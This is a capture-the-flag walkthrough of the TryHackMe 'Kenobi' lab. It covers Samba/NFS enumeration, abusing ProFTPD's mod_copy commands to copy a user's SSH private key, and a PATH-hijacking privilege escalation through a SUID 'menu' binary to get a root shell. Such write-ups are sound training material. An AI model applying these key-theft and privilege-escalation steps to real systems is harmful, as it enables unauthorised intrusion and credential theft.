---
title: 'TryHackMe: Kenobi'
author: Dustin Merritt
categories: [TryHackMe]
tags: [linux, samba, proftpd, smbclien, nc, find]
render_with_liquid: false
media_subpath: /images/tryhackme_kenobi/
image:
  path: room_image.webp
---

![Tryhackme Room Link](room_card.gif){: width="600" height="150" .shadow }
_<https://tryhackme.com/room/kenobi>_

# Task 1 Deploy the Vulnerable Machine

##nmap

```
└─$ nmap -T5 --max-retries 2500 -sC -sV -oN nmap/initial $IP
Starting Nmap 7.95 ( <https://nmap.org> ) at 2025-10-05 15:21 EDT
Nmap scan report for 10.10.107.185
Host is up (0.26s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 f2:45:27:c3:a8:6a:09:72:6e:c3:55:8e:f7:e7:72:e8 (RSA)
|   256 d6:06:39:6d:d0:6f:b5:52:f0:96:d2:44:83:fc:22:6b (ECDSA)
|_  256 3f:4b:2f:06:26:be:38:1f:77:40:c6:f7:bc:92:1a:8d (ED25519)
80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/admin.html
|_http-title: Site doesn't have a title (text/html).
111/tcp  open  rpcbind
| rpcinfo:
|   program version    port/proto  service
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 4
445/tcp  open  netbios-ssn Samba smbd 4
2049/tcp open  nfs_acl     3 (RPC #100227)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: -1s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2025-10-05T19:21:29
|_  start_date: N/A
|_nbstat: NetBIOS name: , NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
Nmap done: 1 IP address (1 host up) scanned in 92.68 seconds

```

<aside>
❓

Scan the machine with nmap, how many ports are open? 7

</aside>

# Task 2 Enumerating Samba for Shares

![image.png](image.png)

Samba is a software suite that makes it possible for Linux and Unix systems to work with Windows networks. It gives users the ability to share and use files, printers, and other common resources across a company’s intranet or even the internet. Because of this, Samba is often described as a type of network file system.

It operates using the Server Message Block (SMB) protocol, which was originally designed only for Windows. Without Samba, computers running Linux or Unix wouldn’t be able to easily connect and communicate with Windows systems on the same network.

---

Using nmap we can enumerate a machine for SMB shares.

Nmap has the ability to run to automate a wide variety of networking tasks. There is a script to enumerate shares!

`nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $IP`

SMB has two ports, 445 and 139.

> The `nmap` command didn’t return any shares for me — it showed **0 shares found**. This could have happened because many servers block anonymous SMB enumeration or require credentials, so the `smb-enum-shares` script often fails. To get around this, I used `enum4linux`, which uses multiple methods (like rpcclient and smbclient) and was able to successfully list the shares. The machine is several years old and may be outdated.
> 

```powershell
enum4linux -a 10.10.107.185
```

![image.png](image%201.png)

![image.png](image%202.png)

<aside>
❓

Using the nmap command above, how many shares have been found? 3

</aside>

You can recursively download the SMB share too. Submit the username and password as nothing.

```powershell
smbget -R smb://$IP/anonymous
```

Using your machine, connect to the machines network share.

<aside>
❓

Once you're connected, list the files on the share. What is the file can you see? log.txt

</aside>

Open the file on the share. There is a few interesting things found.

- Information generated for Kenobi when generating an SSH key for the user
- Information about the ProFTPD server.

```powershell
smbget -R smb://10.10.107.185/anonymous

```

```powershell
smb: \> get log.txt
getting file \log.txt of size 12237 as log.txt (43.3 KiloBytes/sec) (average 43.3 KiloBytes/sec)
```

<aside>
❓

What port is FTP running on? 21

</aside>

Your earlier nmap port scan will have shown port 111 running the service rpcbind. This is just a server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve.

In our case, port 111 is access to a network file system. Lets use nmap to enumerate this.

```powershell
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.107.185
```

> I can’t seem to get the `—script` option to work with nmap at this time. I’ll look into it more later, but I found a work around in `showmount`.
> 

```powershell
showmount -e 10.10.107.185
Export list for 10.10.107.185:
/var *
```

<aside>
❓

What mount can we see? /var

</aside>

# Task 3 Gain Initial Access with ProFtpd

![image.png](image%203.png)

ProFtpd is a free and open-source FTP server, compatible with Unix and Windows systems. Its also been vulnerable in the past software versions.

---

What is the version?

```powershell
nc $IP 21
```

![image.png](image%204.png)

<aside>
❓

What is the version? 1.3.5

</aside>

We can use searchsploit to find exploits for a particular software version.

Searchsploit is basically just a command line search tool for [exploit-db.com](http://exploit-db.com/).

https://www.exploit-db.com/searchsploit

![image.png](image%205.png)

<aside>
❓

How many exploits are there for the ProFTPd running? 3

</aside>

You should have found an exploit from ProFtpd's [mod_copy module](http://www.proftpd.org/docs/contrib/mod_copy.html).

The mod_copy module implements **SITE CPFR** and **SITE CPTO** commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.

<aside>
❗

We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user. 

</aside>

We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user. 

You can find more info by entering:

```powershell
searchsploit -x linux/remote/36742.txt
```

[Bug 4169 – Unauthenticated copying of files via SITE CPFR/CPTO allowed by mod_copy](http://bugs.proftpd.org/show_bug.cgi?id=4169)

We're now going to copy Kenobi's private key using SITE CPFR and SITE CPTO commands.

![image.png](image%206.png)

<aside>
❗

We knew that the /var directory was a mount we could see (task 2, question 4). So we've now moved Kenobi's private key to the /var/tmp directory.

</aside>

Lets mount the /var/tmp directory to our machine.

```powershell
mkdir /mnt/kenobiNFS
mount 10.10.107.185:/var /mnt/kenobiNFS
ls -la /mnt/kenobiNFS
```

![image.png](image%207.png)

We now have a network mount on our deployed machine! We can go to /var/tmp and get the private key then login to Kenobi's account.

```powershell
cp /mnt/kenobiNFS/tmp/id_rsa .
sudo chmod 600 id_rsa
ssh -i id_rsa kenobi@$IP
```

<aside>
❓

What is Kenobi’s user flag (/home/kenobi/user.txt)? You can find it.

</aside>

# Task 4 Privilege Escalation w/ Path Variable Manipulation

![image.png](image%208.png)

Lets first understand what what SUID, SGID and Sticky Bits are.

| **Permission** | **On Files** | **On Directories** |
| --- | --- | --- |
| SUID Bit | User executes the file with permissions of the *file* owner | - |
| SGID Bit | User executes the file with the permission of the *group* owner. | File created in directory gets the same group owner. |
| Sticky Bit | No meaning | Users are prevented from deleting files from other users. |

SUID bits can be dangerous, some binaries such as passwd need to be run with elevated privileges (as its resetting your password on the system), however other custom files could that have the SUID bit can lead to all sorts of issues.

To search the a system for these type of files run the following: `find / -perm -u=s -type f 2>/dev/null`

<aside>
❓

What file looks particularly out of the ordinary? /usr/bin/menu

</aside>

> The `/usr/bin/menu` sticks out when comparing to my own machines result which doesn’t present it in the same find results.
> 

![image.png](image%209.png)

We can abuse this because we can run it as the root user.

<aside>
❓

Run the binary, how many options appear?

</aside>

Strings is a command on Linux that looks for human readable strings on a binary.

```powershell
curl -I localhost
uname -r
ifconfig
```

This shows us the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname).

As this file runs as the root users privileges, we can manipulate our path gain a root shell.

```powershell
echo /bin/sh > curl
chmod 777 curl
export PATH=/tmp:$PATH
/usr/bin/meny
```

![image.png](image%2010.png)

We copied the /bin/sh shell, called it curl, gave it the correct permissions and then put its location in our path. This meant that when the /usr/bin/menu binary was run, its using our path variable to find the "curl" binary.. Which is actually a version of /usr/sh, as well as this file being run as root it runs our shell as root!

<aside>
❓

What is the root flag (/root/root.txt)? You can find it!

</aside>

---

<style>
.center img {
  display: block;
  margin-left: auto;
  margin-right: auto;
}
.wrap pre {
  white-space: pre-wrap;
}
</style>